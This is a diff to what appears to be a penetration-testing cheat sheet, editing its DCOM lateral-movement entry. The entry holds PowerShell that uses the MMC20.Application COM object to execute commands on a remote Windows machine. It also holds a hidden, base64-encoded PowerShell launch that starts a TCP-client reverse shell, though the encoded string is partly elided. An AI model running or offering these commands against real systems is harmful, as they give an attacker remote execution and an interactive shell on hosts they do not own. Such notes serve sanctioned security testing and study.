@@ -2069,12 +2069,13 @@ dir \\<RHOST>\admin$
 ### DCOM
 
 ```powershell
-$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
-
-$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+$dcom=[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","TARGET"))
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami > C:\Windows\Temp\whoami.txt","7")
 
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
 AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+
+
 ```
 
 ### Golden Ticket
